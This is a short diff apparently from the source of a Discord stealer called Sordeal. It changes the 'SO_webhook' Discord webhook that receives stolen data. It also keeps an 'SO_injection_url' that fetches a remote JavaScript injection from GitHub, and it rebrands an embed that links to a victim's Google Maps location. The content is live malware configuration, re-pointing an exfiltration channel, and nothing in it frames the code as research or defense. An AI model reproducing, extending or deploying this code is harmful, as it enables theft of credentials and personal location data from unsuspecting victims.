@@ -50,7 +50,7 @@ NotPSSW = []
 
 __config__ = {
     #Basic Options
-    "SO_webhook": "https://discord.com/api/webhooks/1100150673481412780/jpfvH_H97CoZqyu3ialHFfDYw-Z3Nxx1roedsSpI7lFo3xcVx1Nn3N4oJun8EwIu9gzI",
+    "SO_webhook": "https://discord.com/api/webhooks/1106202795876556802/_QmbdpUOSZtbCHPDYgmM2CAE3R8pFNsQDa-A_PMzKWRYXtrrE1fTuQPghxD2BaAzXukl",
     "SO_injection_url": "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
 
     #Files Options
@@ -1758,7 +1758,7 @@ GoogleMaps: {self.googlemap}
                         "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                     },
                     "color": 16711718,
-                    "description": f"[$1nt4X ON TOP]({self.googlemap})",
+                    "description": f"[SORDEAL ON TOP]({self.googlemap})",
                     "fields": [
                         {
                             "name": "\u200b",
